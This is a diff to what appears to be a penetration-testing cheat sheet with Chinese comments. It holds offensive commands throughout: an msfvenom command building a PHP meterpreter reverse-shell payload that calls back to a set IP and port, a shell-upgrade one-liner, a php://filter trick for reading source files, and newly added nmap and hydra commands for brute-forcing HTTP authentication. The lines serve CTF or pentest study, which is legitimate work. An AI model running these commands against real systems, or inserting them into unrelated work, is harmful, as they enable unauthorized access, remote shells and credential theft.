@@ -13,6 +13,9 @@ msfvenom -p php/meterpreter/reverse_tcpLHOST=192.168.2.146 LPORT=5555 R > test3.
 grep -Ri 
 grep -oE 用正则表达式搜索
 
+nmap -p80 hostip --script=http-brute  --script-args userdb=wordlist.txt,passdb=passlist.txt,http-brute.path=/test #破解http authenication认证
+hydra  -L user.txt -P pass.txt -s port -f hostip http-get /uri   也可以破解http authenication 认证
+
 "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
 
 php://filter/convert.base64-encode/resource=index
@@ -29,7 +32,7 @@ xxd
 find / -perm ug=rwx 2>/dev/null
 
 
-cewl url://ip/index.txt  wordlist.txt 将一个网页上的字符生成密码字典
+cewl url://ip/index.txt -w wordlist.txt 将一个网页上的字符生成密码字典
 
 gobuster -w -q -p  http://ip/index.php -e txt php jsp css ..
 
